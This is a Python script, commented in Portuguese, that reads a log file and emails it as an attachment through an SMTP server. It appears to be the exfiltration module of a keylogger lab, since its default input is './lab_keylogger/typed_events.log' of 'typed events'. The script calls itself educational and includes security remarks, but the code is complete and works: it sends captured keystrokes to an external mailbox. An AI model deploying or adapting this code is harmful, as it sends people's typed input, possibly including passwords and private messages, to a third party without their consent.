from __future__ import annotations

import argparse
import os
import smtplib
from email.message import EmailMessage
from pathlib import Path


class MailError(Exception):
    """Erro ao enviar e-mail."""


def send_log_via_email(
    log_path: Path,
    smtp_host: str,
    smtp_port: int,
    username: str,
    from_addr: str,
    to_addr: str,
    subject: str = "Log de eventos (simulador)",
    use_tls: bool = True,
    password_env_var: str = "SMTP_PASSWORD",
) -> None:
    """
    Envia o conteúdo de um arquivo de log por e-mail.

    Observações de segurança:
    - Nunca deixe senha hardcoded no código.
    - Use variável de ambiente para senha.
    - Não envie logs com dados sensíveis de terceiros.
    """
    log_path = log_path.resolve()
    if not log_path.exists():
        raise MailError(f"Arquivo de log não encontrado: {log_path}")

    try:
        log_content = log_path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        raise MailError(f"Falha ao ler log em {log_path}") from exc

    password = os.getenv(password_env_var)
    if not password:
        raise MailError(
            f"Senha SMTP não encontrada. Defina a variável de ambiente {password_env_var!r}."
        )

    msg = EmailMessage()
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg.set_content(
        "Segue em anexo o log de eventos do simulador.\n\n"
        "Este e-mail foi enviado automaticamente por um script educacional."
    )
    msg.add_attachment(
        log_content.encode("utf-8", errors="replace"),
        maintype="text",
        subtype="plain",
        filename=log_path.name,
    )

    try:
        with smtplib.SMTP(smtp_host, smtp_port, timeout=30) as server:
            server.ehlo()
            if use_tls:
                server.starttls()
                server.ehlo()
            server.login(username, password)
            server.send_message(msg)
    except Exception as exc:
        raise MailError(f"Falha ao enviar e-mail: {exc}") from exc


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Envia um arquivo de log de texto por e-mail (uso educacional)."
    )
    parser.add_argument(
        "--log-path",
        type=Path,
        default=Path("./lab_keylogger/typed_events.log"),
        help="Caminho do arquivo de log (padrão: ./lab_keylogger/typed_events.log)",
    )
    parser.add_argument("--smtp-host", required=True, help="Servidor SMTP (ex: smtp.gmail.com)")
    parser.add_argument("--smtp-port", type=int, default=587, help="Porta SMTP (padrão: 587)")
    parser.add_argument("--username", required=True, help="Usuário SMTP (ex: seu e-mail)")
    parser.add_argument("--from-addr", required=True, help="E-mail do remetente")
    parser.add_argument("--to-addr", required=True, help="E-mail do destinatário")
    parser.add_argument(
        "--subject",
        default="Log de eventos (simulador)",
        help="Assunto do e-mail",
    )
    parser.add_argument(
        "--no-tls",
        action="store_true",
        help="Não usar STARTTLS (não recomendado, exceto em ambientes controlados)",
    )
    parser.add_argument(
        "--password-env-var",
        default="SMTP_PASSWORD",
        help="Nome da variável de ambiente com a senha SMTP (padrão: SMTP_PASSWORD)",
    )
    return parser


def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    try:
        send_log_via_email(
            log_path=args.log_path,
            smtp_host=args.smtp_host,
            smtp_port=args.smtp_port,
            username=args.username,
            from_addr=args.from_addr,
            to_addr=args.to_addr,
            subject=args.subject,
            use_tls=not args.no_tls,
            password_env_var=args.password_env_var,
        )
        print("E-mail enviado com sucesso.")
    except MailError as exc:
        print(f"[ERRO] {exc}")


if __name__ == "__main__":
    main()